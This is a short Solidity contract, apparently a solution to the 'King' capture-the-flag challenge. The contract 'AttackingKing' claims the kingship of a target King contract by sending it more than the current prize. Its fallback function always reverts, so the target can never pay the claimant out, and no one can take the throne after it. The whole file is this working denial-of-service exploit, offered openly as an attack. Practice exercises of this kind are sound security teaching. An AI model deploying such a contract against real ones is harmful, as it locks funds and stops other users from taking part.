// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    // need to prevent execution of setting the new king on the contract
    // value must be greater than the current king's prize
    function hackContract() external {
        (bool success, ) = contractAddress.call{value: King(payable(contractAddress))._prize() + 10}("");
        
        require(success, "Failed to send new prize");
    }

    //  Error: Transaction reverted: function selector was not recognized and there's no fallback nor receive function
    fallback() external payable {
        revert("Transfer didn't work");
    }
}
